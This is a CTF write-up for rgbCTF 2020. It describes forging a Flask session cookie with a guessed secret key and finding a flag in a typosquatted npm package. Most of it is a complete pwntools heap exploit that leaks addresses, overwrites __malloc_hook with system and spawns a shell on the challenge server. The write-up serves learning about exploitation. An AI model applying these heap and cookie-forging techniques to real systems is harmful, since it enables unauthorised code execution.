# rgbCTF 2020

Lots of guess, but redpwn still won.

## Countdown

Web.
The ending date is in a signed cookie w/ Flask.

On the site there is a `Time is key.`, so you guess that `Time` is the secret key and sign a modified cookie (with the end date as some date that already passed).

## Keen Eye

Web.
The site uses a package called `poppers.js`, not the actual `popper.js`. The flag is inside the javascript source code on npm.

## Soda Pop Bop

Good heap chall, cheesed w/ tcache (I got the idea from studysim). Full security checks are in place.

- HOF by setting party size to 0
- Write to tcache freelist to read some libc pointers in .bss
- Write to another tcache freelist to write address of system to __malloc_hook
- Allocate chunk, with the size being the pointer to the string `/bin/sh`

```python
from pwn import *
import ctypes

e = ELF("./spb")
libc = ELF("./libc.so.6")

p = remote("challenge.rgbsec.xyz", 6969)
#p = process("./spb", env={"LD_PRELOAD":libc.path})

#context.log_level="debug"
#gdb.attach(p, """pie break * main+500""")

def choose(length, title="AAAA"):
	p.sendlineafter(">", "1")
	p.sendlineafter(">", str(length))
	p.sendlineafter(">", title)
	print("chose")


def drink(idx, drink):
	p.sendlineafter(">", "2")
	p.sendlineafter(">", str(idx))
	p.sendlineafter(">", str(drink))
	print("got drink")


def sing():
	p.sendlineafter(">", "3")
	print("sang")


p.sendlineafter(">", "0")
p.sendlineafter(">", "")


sing()

leak = p.recvline()

pie_base = int(leak.split()[2][2:], 16) - 0xf08
print("pie_base", hex(pie_base))

choose(0x10)

sing()

leak = p.recvline()

heap_base = int(leak.split()[2][2:], 16) - 0x280
print("heap address", hex(heap_base))


top_chunk = 0x2a0+heap_base

p.sendlineafter(">", "1")
p.sendlineafter(">", str(ctypes.c_ulong(heap_base-top_chunk+0x60 - 24).value))

print("read from", pie_base + 0x202020, hex(pie_base + 0x202020))

p.recvline()
p.recvline()

choose("8", p64(pie_base + 0x202040))

p.recvuntil(">")

choose(8, "")
choose(8, "")

sing()

leak = p.recvline()

libc.address = int(leak.split()[2][2:], 16) - 0x3ec680
print("libc address", hex(libc.address))

print("malloc hook", hex(libc.sym["__malloc_hook"]))

print("system addr", hex(libc.sym["system"]))


binsh = next(libc.search("/bin/sh"))

print("binsh", hex(binsh))


choose(0x69, "\x00"*0x10 + p64(libc.sym["__malloc_hook"]))
choose(0x69, p64(libc.sym["system"]))

p.sendlineafter(">", "1")
p.sendlineafter(">", str(binsh))

p.interactive()
```

Unfortunately I didn't know how to HOF at the time so Rob did it.